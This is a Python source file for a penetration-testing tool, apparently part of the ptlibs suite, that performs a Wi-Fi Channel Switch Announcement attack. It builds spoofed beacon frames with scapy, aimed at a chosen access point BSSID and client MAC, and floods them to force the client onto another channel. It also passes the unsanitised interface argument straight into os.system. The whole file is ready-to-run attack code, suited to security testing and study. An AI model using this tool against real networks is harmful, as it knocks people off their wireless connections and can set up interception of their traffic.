#!/usr/bin/env python3
import argparse
import os
import sys; sys.path.append(__file__.rsplit("/", 1)[0])
import time

from ptlibs import ptjsonlib, ptprinthelper, ptmisclib
from ptlibs.ptprinthelper import ptprint

from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp
from _version import __version__


class PtChannelSwitch:
    def __init__(self, args):
        # Initialize with command line arguments
        self.args = args
        self.ptjsonlib = ptjsonlib.PtJsonLib()

    def run(self):
        # Main execution method handling errors and JSON output
        try:
            self.channel_switch_attack(self.args)
            # Mark successful completion
            self.ptjsonlib.set_status("finished")
        except Exception as e:
            # Record the error in JSON output using end_error with JSON flag
            self.ptjsonlib.end_error(str(e), self.args.json)
        finally:
            # Always output the final JSON result
            ptprint(self.ptjsonlib.get_result_json(), "", self.args.json)

    def set_channel(self, iface, channel):
        # Change the wireless interface channel
        os.system(f"iw dev {iface} set channel {channel}")

    def channel_switch_attack(self, args):
        # Set the interface to the current channel
        self.set_channel(args.iface, args.current_channel)
        
        # Calculate end time based on duration
        end_time = time.time() + args.time
        
        # Display attack information
        ptprint(f"Injecting on channel {args.current_channel}", bullet_type="INFO", condition=not self.args.json)
        ptprint(f"Forcing the target to switch to channel {args.new_channel}", bullet_type="INFO", condition=not self.args.json)

        # Build the CSA frame
        dot11 = Dot11(type=0, subtype=8, addr1=args.mac, addr2=args.bssid, addr3=args.bssid)
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=args.ssid, len=len(args.ssid))
        
        # CSA element structure: mode(0) + new_channel + count(0)
        csa_info = b"\x00" + bytes([args.new_channel]) + b"\x00"
        csa = Dot11Elt(ID=37, info=csa_info)  # ID 37 is Channel Switch Announcement
        
        # Assemble the complete frame
        frame = RadioTap() / dot11 / beacon / essid / csa

        ptprint(f"Sending CSA frames for {args.time} seconds...", bullet_type="INFO", condition=not self.args.json)

        # Send frames until timeout
        while time.time() < end_time:
            sendp(frame, iface=args.iface, verbose=0)
            time.sleep(args.interval)

        ptprint(f"CSA attack finished.", bullet_type="INFO", condition=not self.args.json)


def get_help():
    # Define help information for the CLI tool in structured format
    return [
        {"description": ["Channel Switch Announcement (CSA) attack tool."]},
        {"usage": ["ptchannelswitch <options>"]},
        {"usage_example": [
            "ptchannelswitch -i wlan0mon -b 00:11:22:33:44:55 -m 66:77:88:99:AA:BB -s MyNetwork -c 9 -t 60",
            "ptchannelswitch -i wlan0mon -b 00:11:22:33:44:55 -m 66:77:88:99:AA:BB -s MyNetwork -c 9 -nc 1 -t 60",
        ]},
        {"options": [
            ["-i", "--iface",           "<interface>", "Monitor-mode interface (e.g., wlan0mon)"],
            ["-b", "--bssid",           "<bssid>",     "BSSID of the target AP"],
            ["-m", "--mac",             "<mac>",       "MAC address of the target client"],
            ["-s", "--ssid",            "<ssid>",      "SSID of the target network"],
            ["-c", "--current-channel", "<channel>",   "Actual AP channel (default: 11)"],
            ["-nc", "--new-channel",    "<channel>",   "Channel to force the client onto (default: 1)"],
            ["-t", "--time",            "<seconds>",   "Duration of the attack (in seconds)"],
            ["-r", "--interval",        "<seconds>",   "Interval between frame transmissions (seconds)"],
            ["-v", "--version",         "",            "Show script version and exit"],
            ["-h", "--help",            "",            "Show this help message and exit"],
            ["-j", "--json",            "",            "Output in JSON format"],
        ]}
    ]


def parse_args():
    # Parse and validate command line arguments
    parser = argparse.ArgumentParser(
        description='Channel Switch Announcement (CSA) attack tool.',
        add_help=False
    )
    parser.add_argument('-i', '--iface', required=True, type=str, help='Monitor-mode interface (e.g., wlan0mon)')
    parser.add_argument('-b', '--bssid', required=True, type=str, help='BSSID of the target AP')
    parser.add_argument('-m', '--mac', required=True, type=str, help='MAC address of the target client')
    parser.add_argument('-s', '--ssid', required=True, type=str, help='SSID of the target network')
    parser.add_argument('-c', '--current-channel', type=int, default=11, help='Actual AP channel (default: 11)')
    parser.add_argument('-nc', '--new-channel', type=int, default=1, help='Channel to force the client onto (default: 1)')
    parser.add_argument('-t', '--time', required=True, type=int, help='Duration of the attack (in seconds)')
    parser.add_argument('-r', '--interval', type=float, default=0.1, help='Interval between frame transmissions (seconds)')
    parser.add_argument('-j', '--json', action='store_true', help='Output in JSON format')
    parser.add_argument('-v', '--version', action='version', version=f'{SCRIPTNAME} {__version__}')

    # Handle help request
    if len(sys.argv) == 1 or '-h' in sys.argv or '--help' in sys.argv:
        ptprinthelper.help_print(get_help(), SCRIPTNAME, __version__)
        sys.exit(0)

    args = parser.parse_args()
    ptprinthelper.print_banner(SCRIPTNAME, __version__, args.json, space=0)
    return args


def main():
    # Main entry point for the program
    global SCRIPTNAME
    SCRIPTNAME = "ptchannelswitch"
    args = parse_args()
    script = PtChannelSwitch(args)
    script.run()


if __name__ == '__main__':
    main()
